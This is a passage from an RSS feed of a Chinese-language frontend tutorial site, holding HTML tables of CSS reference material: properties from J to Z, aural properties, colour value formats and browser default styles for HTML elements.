<tr>
<td style="text-align:center">justify-items</td>
<td style="text-align:left">规定网格项在行内方向的对齐方式。在网格容器上设置</td>
</tr>
<tr>
<td style="text-align:center">justify-self</td>
<td style="text-align:left">规定网格项在行内方向的对齐方式。在网格项上设置</td>
</tr>
</tbody>
</table>
<h2> K</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">@keyframes</td>
<td style="text-align:left">规定动画代码</td>
</tr>
</tbody>
</table>
<h2> L</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">left</td>
<td style="text-align:left">规定定位元素的左侧位置</td>
</tr>
<tr>
<td style="text-align:center">letter-spacing</td>
<td style="text-align:left">增加或减少文本中的字符间距</td>
</tr>
<tr>
<td style="text-align:center">line-break</td>
<td style="text-align:left">如何如何/是否换行</td>
</tr>
<tr>
<td style="text-align:center">line-height</td>
<td style="text-align:left">设置行高</td>
</tr>
<tr>
<td style="text-align:center">list-style</td>
<td style="text-align:left">在一条声明中设置所有列表属性</td>
</tr>
<tr>
<td style="text-align:center">list-style-image</td>
<td style="text-align:left">把图像指定为列表项标记</td>
</tr>
<tr>
<td style="text-align:center">list-style-position</td>
<td style="text-align:left">规定列表项标记的位置</td>
</tr>
<tr>
<td style="text-align:center">list-style-type</td>
<td style="text-align:left">规定列表项标记的类型</td>
</tr>
</tbody>
</table>
<h2> M</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">margin</td>
<td style="text-align:left">在一条声明中设置所有外边距属性</td>
</tr>
<tr>
<td style="text-align:center">margin-bottom</td>
<td style="text-align:left">设置元素的下外边距</td>
</tr>
<tr>
<td style="text-align:center">margin-left</td>
<td style="text-align:left">设置元素的左外边距</td>
</tr>
<tr>
<td style="text-align:center">margin-right</td>
<td style="text-align:left">设置元素的右外边距</td>
</tr>
<tr>
<td style="text-align:center">margin-top</td>
<td style="text-align:left">设置元素的上外边距</td>
</tr>
<tr>
<td style="text-align:center">mask</td>
<td style="text-align:left">通过在特定位置遮罩或剪切图像来隐藏元素</td>
</tr>
<tr>
<td style="text-align:center">mask-type</td>
<td style="text-align:left">规定将遮罩元素用作亮度或 Alpha 遮罩</td>
</tr>
<tr>
<td style="text-align:center">max-height</td>
<td style="text-align:left">设置元素的最大高度</td>
</tr>
<tr>
<td style="text-align:center">max-width</td>
<td style="text-align:left">设置元素的最大宽度</td>
</tr>
<tr>
<td style="text-align:center">@media</td>
<td style="text-align:left">为不同的媒体类型、设备、尺寸设置样式规则</td>
</tr>
<tr>
<td style="text-align:center">min-height</td>
<td style="text-align:left">设置元素的最小高度</td>
</tr>
<tr>
<td style="text-align:center">min-width</td>
<td style="text-align:left">设置元素的最小宽度</td>
</tr>
<tr>
<td style="text-align:center">mix-blend-mode</td>
<td style="text-align:left">规定元素内容应如何与其直接父的背景相混合</td>
</tr>
</tbody>
</table>
<h2> O</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">object-fit</td>
<td style="text-align:left">规定替换元素的内容应如何适合其所用高度和宽度建立的框</td>
</tr>
<tr>
<td style="text-align:center">object-position</td>
<td style="text-align:left">指定替换元素在其框内的对齐方式</td>
</tr>
<tr>
<td style="text-align:center">opacity</td>
<td style="text-align:left">设置元素的不透明等级</td>
</tr>
<tr>
<td style="text-align:center">order</td>
<td style="text-align:left">设置弹性项目相对于其余项目的顺序</td>
</tr>
<tr>
<td style="text-align:center">orphans</td>
<td style="text-align:left">设置在元素内发生分页时必须保留在页面底部的最小行数</td>
</tr>
<tr>
<td style="text-align:center">outline</td>
<td style="text-align:left">outline-width、outline-style 以及 outline-color 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">outline-color</td>
<td style="text-align:left">设置轮廓的颜色</td>
</tr>
<tr>
<td style="text-align:center">outline-offset</td>
<td style="text-align:left">对轮廓进行偏移，并将其绘制到边框边缘之外</td>
</tr>
<tr>
<td style="text-align:center">outline-style</td>
<td style="text-align:left">设置轮廓的样式</td>
</tr>
<tr>
<td style="text-align:center">outline-width</td>
<td style="text-align:left">设置轮廓的宽度</td>
</tr>
<tr>
<td style="text-align:center">overflow</td>
<td style="text-align:left">规定如果内容溢出元素框会发生什么情况</td>
</tr>
<tr>
<td style="text-align:center">overflow-wrap</td>
<td style="text-align:left">规定浏览器是否可能为了防止溢出而在单词内折行（当字符串太长而无法适应其包含框时）</td>
</tr>
<tr>
<td style="text-align:center">overflow-x</td>
<td style="text-align:left">规定是否剪裁内容的左右边缘，如果它溢出了元素的内容区域</td>
</tr>
<tr>
<td style="text-align:center">overflow-y</td>
<td style="text-align:left">规定是否剪裁内容的上下边缘，如果它溢出了元素的内容区域</td>
</tr>
</tbody>
</table>
<h2> P</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">padding</td>
<td style="text-align:left">所有 padding-* 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">padding-bottom</td>
<td style="text-align:left">设置元素的下内边距</td>
</tr>
<tr>
<td style="text-align:center">padding-left</td>
<td style="text-align:left">设置元素的左内边距</td>
</tr>
<tr>
<td style="text-align:center">padding-right</td>
<td style="text-align:left">设置元素的右内边距</td>
</tr>
<tr>
<td style="text-align:center">padding-top</td>
<td style="text-align:left">设置元素的上内边距</td>
</tr>
<tr>
<td style="text-align:center">page-break-after</td>
<td style="text-align:left">设置元素之后的分页（page-break）行为</td>
</tr>
<tr>
<td style="text-align:center">page-break-before</td>
<td style="text-align:left">设置元素之前的分页（page-break）行为</td>
</tr>
<tr>
<td style="text-align:center">page-break-inside</td>
<td style="text-align:left">设置元素内的分页（page-break）行为</td>
</tr>
<tr>
<td style="text-align:center">perspective</td>
<td style="text-align:left">为 3D 定位元素提供透视</td>
</tr>
<tr>
<td style="text-align:center">perspective-origin</td>
<td style="text-align:left">定义用户观看 3D 定位元素的位置</td>
</tr>
<tr>
<td style="text-align:center">pointer-events</td>
<td style="text-align:left">定义元素是否对指针事件做出反应</td>
</tr>
<tr>
<td style="text-align:center">position</td>
<td style="text-align:left">规定用于元素的定位方法的类型（静态、相对、绝对或固定）</td>
</tr>
</tbody>
</table>
<h2> Q</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">quotes</td>
<td style="text-align:left">设置引号类型</td>
</tr>
</tbody>
</table>
<h2> R</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">resize</td>
<td style="text-align:left">定义用户是否以及如何调整元素的尺寸</td>
</tr>
<tr>
<td style="text-align:center">right</td>
<td style="text-align:left">规定定位元素的左侧位置</td>
</tr>
</tbody>
</table>
<h2> S</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">scroll-behavior</td>
<td style="text-align:left">规定可滚动框中是否平滑地滚动，而不是直接跳跃</td>
</tr>
</tbody>
</table>
<h2> T</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">tab-size</td>
<td style="text-align:left">规定制表符的宽度</td>
</tr>
<tr>
<td style="text-align:center">table-layout</td>
<td style="text-align:left">定义用于对单元格、行和列进行布局的算法</td>
</tr>
<tr>
<td style="text-align:center">text-align</td>
<td style="text-align:left">规定文本的水平对齐方式</td>
</tr>
<tr>
<td style="text-align:center">text-align-last</td>
<td style="text-align:left">描述当 text-align 为 "justify" 时，如何在强制换行之前对齐块或行的最后一行</td>
</tr>
<tr>
<td style="text-align:center">text-combine-upright</td>
<td style="text-align:left">将多个字符组合到到单个字符的空间中</td>
</tr>
<tr>
<td style="text-align:center">text-decoration</td>
<td style="text-align:left">规定文本装饰</td>
</tr>
<tr>
<td style="text-align:center">text-decoration-color</td>
<td style="text-align:left">规定文本装饰（text-decoration）的颜色</td>
</tr>
<tr>
<td style="text-align:center">text-decoration-line</td>
<td style="text-align:left">规定文本装饰（text-decoration）中的的行类型</td>
</tr>
<tr>
<td style="text-align:center">text-decoration-style</td>
<td style="text-align:left">规定文本装饰（text-decoration）中的行样式</td>
</tr>
<tr>
<td style="text-align:center">text-indent</td>
<td style="text-align:left">规定文本块（text-block）中的的首行缩进</td>
</tr>
<tr>
<td style="text-align:center">text-justify</td>
<td style="text-align:left">规定当 text-align 为 "justify" 时使用的对齐方法</td>
</tr>
<tr>
<td style="text-align:center">text-orientation</td>
<td style="text-align:left">定义行中的文本方向</td>
</tr>
<tr>
<td style="text-align:center">text-overflow</td>
<td style="text-align:left">规定当文本溢出包含元素时应该发生的情况</td>
</tr>
<tr>
<td style="text-align:center">text-shadow</td>
<td style="text-align:left">添加文本阴影</td>
</tr>
<tr>
<td style="text-align:center">text-transform</td>
<td style="text-align:left">控制文本的大写</td>
</tr>
<tr>
<td style="text-align:center">text-underline-position</td>
<td style="text-align:left">规定使用 text-decoration 属性设置的下划线的位置</td>
</tr>
<tr>
<td style="text-align:center">top</td>
<td style="text-align:left">规定定位元素的顶端位置</td>
</tr>
<tr>
<td style="text-align:center">transform</td>
<td style="text-align:left">向元素应用 2D 或 3D 转换</td>
</tr>
<tr>
<td style="text-align:center">transform-origin</td>
<td style="text-align:left">允许您更改转换元素的位置</td>
</tr>
<tr>
<td style="text-align:center">transform-style</td>
<td style="text-align:left">规定如何在 3D 空间中渲染嵌套的元素</td>
</tr>
<tr>
<td style="text-align:center">transition</td>
<td style="text-align:left">所有 transition-* 属性的简写属性</td>
</tr>
<tr>
<td style="text-align:center">transition-delay</td>
<td style="text-align:left">规定合适开始过渡效果</td>
</tr>
<tr>
<td style="text-align:center">transition-duration</td>
<td style="text-align:left">规定完成过渡效果所需的秒或毫秒数</td>
</tr>
<tr>
<td style="text-align:center">transition-property</td>
<td style="text-align:left">规定过渡效果对应的 CSS 属性的名称</td>
</tr>
<tr>
<td style="text-align:center">transition-timing-function</td>
<td style="text-align:left">规定过渡效果的速度曲线</td>
</tr>
</tbody>
</table>
<h2> U</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">unicode-bidi</td>
<td style="text-align:left">与 direction 属性一起使用，设置或返回是否应覆写文本来支持同一文档中的多种语言</td>
</tr>
<tr>
<td style="text-align:center">user-select</td>
<td style="text-align:left">规定是否能选取元素的文本</td>
</tr>
</tbody>
</table>
<h2> V</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">vertical-align</td>
<td style="text-align:left">设置元素的垂直对齐方式</td>
</tr>
<tr>
<td style="text-align:center">visibility</td>
<td style="text-align:left">规定元素是否可见</td>
</tr>
</tbody>
</table>
<h2> W</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">white-space</td>
<td style="text-align:left">规定如何处理元素内的空白字符</td>
</tr>
<tr>
<td style="text-align:center">widows</td>
<td style="text-align:left">设置如果元素内发生分页，必须在页面顶部保留的最小行数</td>
</tr>
<tr>
<td style="text-align:center">width</td>
<td style="text-align:left">设置元素的宽度</td>
</tr>
<tr>
<td style="text-align:center">word-break</td>
<td style="text-align:left">规定单词到达行末后如何换行</td>
</tr>
<tr>
<td style="text-align:center">word-spacing</td>
<td style="text-align:left">增加或减少文本中的单词间距</td>
</tr>
<tr>
<td style="text-align:center">word-wrap</td>
<td style="text-align:left">允许长的、不能折行的单词换到下一行</td>
</tr>
<tr>
<td style="text-align:center">writing-mode</td>
<td style="text-align:left">规定文本行是水平还是垂直布局</td>
</tr>
</tbody>
</table>
<h2> Z</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">z-index</td>
<td style="text-align:left">设置定位元素的堆叠顺序</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>听觉</title>
      <link>https://sankgao.github.io/languages/css3/references/aural.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/aural.html</guid>
      <source url="https://sankgao.github.io/rss.xml">听觉</source>
      <description>CSS 列指示该属性在哪个 CSS 版本中定义（CSS1 或 CSS2）。 属性 描述 值 CSS :---- :---- :---- :----: azimuth 设置声音的来源 angleleft-sidefar-leftleftcenter-leftcentercenter-rightrightfar-rightright-sidebehindl...</description>
      <category>Frontend</category>
      <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS 列指示该属性在哪个 CSS 版本中定义（CSS1 或 CSS2）。</p>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">值</th>
<th style="text-align:center">CSS</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">azimuth</td>
<td style="text-align:left">设置声音的来源</td>
<td style="text-align:left">angle<br>left-side<br>far-left<br>left<br>center-left<br>center<br>center-right<br>right<br>far-right<br>right-side<br>behind<br>leftwards<br>rightwards<br></td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">cue</td>
<td style="text-align:left">在一条声明中设置 cue 属性</td>
<td style="text-align:left">cue-before<br>cue-after</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">cue-after</td>
<td style="text-align:left">规定念出元素内容后要播放的声音</td>
<td style="text-align:left">none<br>url</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">cue-before</td>
<td style="text-align:left">规定念出元素内容前要播放的声音</td>
<td style="text-align:left">url</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">elevation</td>
<td style="text-align:left">设置声音的来源</td>
<td style="text-align:left">angle<br>below<br>level<br>above<br>higher<br>lower</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">pause</td>
<td style="text-align:left">在一条声明中设置暂停属性</td>
<td style="text-align:left">pause-before<br>pause-after</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">pause-after</td>
<td style="text-align:left">规定在念出元素内容后暂停</td>
<td style="text-align:left">time<br>%</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">pause-before</td>
<td style="text-align:left">规定在念出元素内容前暂停</td>
<td style="text-align:left">time<br>%</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">pitch</td>
<td style="text-align:left">规定说话的声音</td>
<td style="text-align:left">frequency<br>x-low<br>low<br>medium<br>high<br>x-high</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">pitch-range</td>
<td style="text-align:left">规定语音的变化（单调还是动听的声音）</td>
<td style="text-align:left">number</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">play-during</td>
<td style="text-align:left">规定在念出元素内容时要播放的声音</td>
<td style="text-align:left">auto<br>none<br>url<br>mix<br>repeat</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">richness</td>
<td style="text-align:left">指定语音的丰富程度。（声音丰富还是稀薄）</td>
<td style="text-align:left">number</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">speak</td>
<td style="text-align:left">规定内容是否将以声音形式呈现</td>
<td style="text-align:left">normal<br>none<br>spell-out</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">speak-header</td>
<td style="text-align:left">指定如何处理表格标题。应该在每个单元格之前朗读标题，还是仅在标题与前一个单元格不同的单元格之前念出标题</td>
<td style="text-align:left">always<br>once</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">speak-numeral</td>
<td style="text-align:left">规定如何念出数字</td>
<td style="text-align:left">digits<br>continuous</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">speak-punctuation</td>
<td style="text-align:left">规定如何念出标点符号</td>
<td style="text-align:left">none<br>code</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">speech-rate</td>
<td style="text-align:left">规定说话的速度</td>
<td style="text-align:left">number<br>x-slow<br>slow<br>medium<br>fast<br>x-fast<br>faster<br>slower</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">stress</td>
<td style="text-align:left">规定语音中的 “压力”</td>
<td style="text-align:left">number</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">voice-family</td>
<td style="text-align:left">规定语音的语音家族</td>
<td style="text-align:left">specific-voice<br>generic-voice</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:left">volume</td>
<td style="text-align:left">规定说话的音量</td>
<td style="text-align:left">number<br>%<br>silent<br>x-soft<br>soft<br>medium<br>loud<br>x-loud</td>
<td style="text-align:center">2</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>颜色</title>
      <link>https://sankgao.github.io/languages/css3/references/colors.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/colors.html</guid>
      <source url="https://sankgao.github.io/rss.xml">颜色</source>
      <description>CSS 颜色 所有现代浏览器均支持以下 140 种颜色名称。 红色（Red） 演示 橙色（Orange） 演示 黄色（Yellow） 演示 绿色（Green） 演示 青色（Cyan） 演示 蓝色（Blue） 演示 紫色（Purple） 演示 粉红色（Pink） 演示 白色（White） 演示 灰色（Gray） 演示 棕色（Brown） 演示 合法颜色值...</description>
      <category>Frontend</category>
      <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> CSS 颜色</h2>
<p>所有现代浏览器均支持以下 140 种颜色名称。</p>
<h3> 红色（Red）</h3>

<h3> 橙色（Orange）</h3>

<h3> 黄色（Yellow）</h3>

<h3> 绿色（Green）</h3>

<h3> 青色（Cyan）</h3>

<h3> 蓝色（Blue）</h3>

<h3> 紫色（Purple）</h3>

<h3> 粉红色（Pink）</h3>

<h3> 白色（White）</h3>

<h3> 灰色（Gray）</h3>

<h3> 棕色（Brown）</h3>

<h2> 合法颜色值</h2>
<p>CSS 中的颜色可以通过以下方法指定：</p>
<ul>
<li>十六进制颜色</li>
<li>带透明度的十六进制颜色</li>
<li>RGB 颜色</li>
<li>RGBA 颜色</li>
<li>HSL 颜色</li>
<li>HSLA 颜色</li>
<li>预定义或跨浏览器的颜色名称</li>
<li>使用 <code>currentcolor</code> 关键字</li>
</ul>
<h3> 十六进制颜色</h3>
<p>用 <code>#RRGGBB</code> 规定十六进制颜色，其中 <code>RR</code>（红色）、<code>GG</code>（绿色）和 <code>BB</code>（蓝色）十六进制整数指定颜色的成分（分量）。所有值必须在 <code>00</code> 到 <code>FF</code> 之间。</p>
<p>例如：<code>＃0000ff</code> 值呈现为蓝色，因为蓝色分量设置为最高值（<code>ff</code>），其他分量设置为 <code>00</code>。</p>

<h3> 带透明度的十六进制颜色</h3>
<p>用 <code>#RRGGBB</code> 规定十六进制颜色。如需增加透明度，请在颜色最后添加两个额外的数字，所有值必须在 <code>00</code> 到 <code>FF</code> 之间。例如：</p>

<h3> RGB 颜色</h3>
<p>RGB 颜色值由 <code>rgb()</code> 函数规定，语法：<code>rgb(red, green, blue)</code>。</p>
<p>每个参数（<code>red</code>, <code>green</code>, <code>blue</code>）定义颜色的强度，可以是 <code>0</code> 到 <code>255</code> 之间的整数或百分比值（从 <code>0%</code> 到 <code>100%</code>）。</p>
<p>例如：值 <code>rgb(0, 0, 255)</code> 或 <code>rgb(0%, 0%, 100%)</code> 呈现为蓝色，因为 <code>blue</code> 参数设置为其最高值（<code>255</code>），其他参数设置为 <code>0</code>。</p>

<h3> RGBA 颜色</h3>
<p><code>RGBA</code> 颜色值是 <code>RGB</code> 颜色值的扩展，它带有 <code>Alpha</code> 通道指定对象的不透明度。</p>
<p><code>RGBA</code> 颜色通过 <code>rgba()</code> 函数规定，语法：<code>rgba(red, green, blue, alpha)</code>。</p>
<p><code>alpha</code> 参数是介于 <code>0.0</code>（完全透明）和 <code>1.0</code>（完全不透明）之间的数字。例如：</p>

<h3> HSL 颜色</h3>
<p><code>HSL</code> 指的是色相（hue）、饱和度（saturation）和亮度（lightness），代表颜色的圆柱坐标表示。</p>
<p>使用 <code>hsl()</code> 函数指定 HSL 颜色值，该函数的语法：<code>hsl(hue, saturation, lightness)</code></p>
<ul>
<li><strong>色相</strong>：是色轮上的度数（从 <code>0</code> 到 <code>360</code>），<code>0</code>（或 <code>360</code>）是红色，<code>120</code> 是绿色，<code>240</code> 是蓝色</li>
<li><strong>饱和度</strong>：是一个百分比值，<code>0%</code> 表示灰色阴影，而 <code>100%</code> 是全彩色</li>
<li><strong>亮度</strong>：也是一个百分比，<code>0%</code> 是黑色，<code>100%</code> 是白色</li>
</ul>

<h3> HSLA 颜色</h3>
<p><code>HSLA</code> 颜色值是 <code>HSL</code> 颜色值的扩展，它带有 <code>Alpha</code> 通道，指定对象的不透明度。</p>
<p><code>HSLA</code> 颜色值由 <code>hsla()</code> 函数指定，该函数的语法：<code>hsla(hue, saturation, lightness, alpha)</code></p>
<p><code>alpha</code> 参数是介于 <code>0.0</code>（完全透明）和 <code>1.0</code>（完全不透明）之间的数字。</p>

<h3> 预定义或跨浏览器的颜色名称</h3>
<p><code>HTML</code> 和 <code>CSS</code> 颜色规范中预定义了 <code>140</code> 个颜色名称。</p>
<p>例如：<code>red</code>、<code>green</code>、<code>blue</code> 等。</p>

<h3> currentcolor 关键字</h3>
<p><code>currentcolor</code> 关键字引用元素的 <code>color</code> 属性值。</p>
<p>例如：以下 <code>&lt;div&gt;</code> 元素的边框颜色将为蓝色，因为 <code>&lt;div&gt;</code> 元素的文本颜色为蓝色。</p>

]]></content:encoded>
    </item>
    <item>
      <title>默认值</title>
      <link>https://sankgao.github.io/languages/css3/references/default_values.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/default_values.html</guid>
      <source url="https://sankgao.github.io/rss.xml">默认值</source>
      <description>下表显示了所有 HTML 元素的默认 CSS 浏览器值。 元素 默认的 CSS 值 :----: :---- a:link color: (internal value);text-decoration: underline;cursor: auto; a:visited color: (internal value);text-decoration:...</description>
      <category>Frontend</category>
      <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>下表显示了所有 HTML 元素的默认 CSS 浏览器值。</p>
<table>
<thead>
<tr>
<th style="text-align:center">元素</th>
<th style="text-align:left">默认的 CSS 值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">a:link</td>
<td style="text-align:left">color: (internal value);<br>text-decoration: underline;<br>cursor: auto;</td>
</tr>
<tr>
<td style="text-align:center">a:visited</td>
<td style="text-align:left">color: (internal value);<br>text-decoration: underline;<br>cursor: auto;</td>
</tr>
<tr>
<td style="text-align:center"><code>a:link:active</code></td>
<td style="text-align:left">color: (internal value);</td>
</tr>
<tr>
<td style="text-align:center">a:visited:active</td>
<td style="text-align:left">color: (internal value);</td>
</tr>
<tr>
<td style="text-align:center">abbr</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">address</td>
<td style="text-align:left">display: block;<br>font-style: italic;</td>
</tr>
<tr>
<td style="text-align:center">area</td>
<td style="text-align:left">display: none;</td>
</tr>
<tr>
<td style="text-align:center">article</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">aside</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">audio</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">b</td>
<td style="text-align:left">font-weight: bold;</td>
</tr>
<tr>
<td style="text-align:center">base</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">bdi</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">bdo</td>
<td style="text-align:left">unicode-bidi: bidi-override;</td>
</tr>
<tr>
<td style="text-align:center">blockquote</td>
<td style="text-align:left">display: block;<br>margin-top: 1em;<br>margin-bottom: 1em;<br>margin-left: 40px;<br>margin-right: 40px;</td>
</tr>
<tr>
<td style="text-align:center">body</td>
<td style="text-align:left">display: block;<br>margin: 8px;</td>
</tr>
<tr>
<td style="text-align:center">body:focus</td>
<td style="text-align:left">outline: none;</td>
</tr>
<tr>
<td style="text-align:center">br</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">button</td>
<td style="text-align:left">None</td>
</tr>
<tr>
<td style="text-align:center">canvas</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">caption</td>
<td style="text-align:left">display: table-caption;<br>text-align: center;</td>
</tr>
<tr>
<td style="text-align:center">cite</td>
<td style="text-align:left">font-style: italic;</td>
</tr>
<tr>
<td style="text-align:center">code</td>
<td style="text-align:left">font-family: monospace;</td>
</tr>
<tr>
<td style="text-align:center">col</td>
<td style="text-align:left">display: table-column;</td>
</tr>
<tr>
<td style="text-align:center">colgroup</td>
<td style="text-align:left">display: table-column-group;</td>
</tr>
<tr>
<td style="text-align:center">datalist</td>
<td style="text-align:left">display: none;</td>
</tr>
<tr>
<td style="text-align:center">dd</td>
<td style="text-align:left">display: block;<br>margin-left: 40px;</td>
</tr>
<tr>
<td style="text-align:center">del</td>
<td style="text-align:left">text-decoration: line-through;</td>
</tr>
<tr>
<td style="text-align:center">details</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">dfn</td>
<td style="text-align:left">font-style: italic;</td>
</tr>
<tr>
<td style="text-align:center">dialog</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">div</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">dl</td>
<td style="text-align:left">display: block;<br>margin-top: 1em;<br>margin-bottom: 1em;<br>margin-left: 0;<br>margin-right: 0;</td>
</tr>
<tr>
<td style="text-align:center">dt</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">em</td>
<td style="text-align:left">font-style: italic;</td>
</tr>
<tr>
<td style="text-align:center">embed:focus</td>
<td style="text-align:left">outline: none;</td>
</tr>
<tr>
<td style="text-align:center">fieldset</td>
<td style="text-align:left">display: block;<br>margin-left: 2px;<br>margin-right: 2px;<br>padding-top: 0.35em;<br>padding-bottom: 0.625em;<br>padding-left: 0.75em;<br>padding-right: 0.75em;<br>border: 2px groove (internal value);</td>
</tr>
<tr>
<td style="text-align:center">figcaption</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">figure</td>
<td style="text-align:left">display: block;<br>margin-top: 1em;<br>margin-bottom: 1em;<br>margin-left: 40px;<br>margin-right: 40px;</td>
</tr>
<tr>
<td style="text-align:center">footer</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">form</td>
<td style="text-align:left">display: block;<br>margin-top: 0em;</td>
</tr>
<tr>
<td style="text-align:center">h1</td>
<td style="text-align:left">display: block;<br>font-size: 2em;<br>margin-top: 0.67em;<br>margin-bottom: 0.67em;<br>margin-left: 0;<br>margin-right: 0;<br>font-weight: bold;</td>
</tr>
<tr>
<td style="text-align:center">h2</td>
<td style="text-align:left">display: block;<br>font-size: 1.5em;<br>margin-top: 0.83em;<br>margin-bottom: 0.83em;<br>margin-left: 0;<br>margin-right: 0;<br>font-weight: bold;</td>
</tr>
<tr>
<td style="text-align:center">h3</td>
<td style="text-align:left">display: block;<br>font-size: 1.17em;<br>margin-top: 1em;<br>margin-bottom: 1em;<br>margin-left: 0;<br>margin-right: 0;<br>font-weight: bold;</td>
</tr>
<tr>
<td style="text-align:center">h4</td>
<td style="text-align:left">display: block;<br>margin-top: 1.33em;<br>margin-bottom: 1.33em;<br>margin-left: 0;<br>margin-right: 0;<br>font-weight: bold;</td>
</tr>
<tr>
<td style="text-align:center">h5</td>
<td style="text-align:left">display: block;<br>font-size: .83em;<br>margin-top: 1.67em;<br>margin-bottom: 1.67em;<br>margin-left: 0;<br>margin-right: 0;<br>font-weight: bold;</td>
</tr>
<tr>
<td style="text-align:center">h6</td>
<td style="text-align:left">display: block;<br>font-size: .67em;<br>margin-top: 2.33em;<br>margin-bottom: 2.33em;<br>margin-left: 0;<br>margin-right: 0;<br>font-weight: bold;</td>
</tr>
<tr>
<td style="text-align:center">head</td>
<td style="text-align:left">display: none;</td>
</tr>
<tr>
<td style="text-align:center">header</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">hr</td>
<td style="text-align:left">display: block;<br>margin-top: 0.5em;<br>margin-bottom: 0.5em;<br>margin-left: auto;<br>margin-right: auto;<br>border-style: inset;<br>border-width: 1px;</td>
</tr>
<tr>
<td style="text-align:center">html</td>
<td style="text-align:left">display: block;<br>html:focus<br>outline: none;</td>
</tr>
<tr>
<td style="text-align:center">i</td>
<td style="text-align:left">font-style: italic;</td>
</tr>
<tr>
<td style="text-align:center">iframe:focus</td>
<td style="text-align:left">outline: none;</td>
</tr>
<tr>
<td style="text-align:center">iframe[seamless]</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">img</td>
